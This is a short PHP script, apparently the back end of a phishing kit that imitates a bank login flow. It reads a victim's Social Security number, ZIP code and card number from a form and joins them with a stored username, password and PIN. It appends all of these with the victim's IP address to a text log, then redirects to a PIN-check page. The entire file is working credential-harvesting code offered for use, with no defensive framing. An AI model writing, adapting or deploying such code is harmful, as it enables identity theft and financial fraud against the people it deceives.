<?php
//code by Microcip2019
session_start();
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('America/Los_Angeles');
$date = date('h:i',time());
$exipra = date('h:i', strtotime('+ 2 hours +30 minutes'));

$_SESSION['ssn'] = trim($_POST['ssn']);
$_SESSION['zip'] = trim($_POST['zip']);
$_SESSION['card'] = trim($_POST['card']);
//NOnaME

$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$pin = $_SESSION['pin'];
$ssn = $_SESSION['ssn'];
$zip = $_SESSION['zip'];
$card = $_SESSION['card'];


$fw2 = fopen("no1.txt","a");
        $data= "... $ip $user $pass Pin: $pin Ssn: $ssn Zip: $zip Card: $card\n";
        fputs($fw2,$data);
        fclose($fw2);

header("Location: checkingpin.php");

?>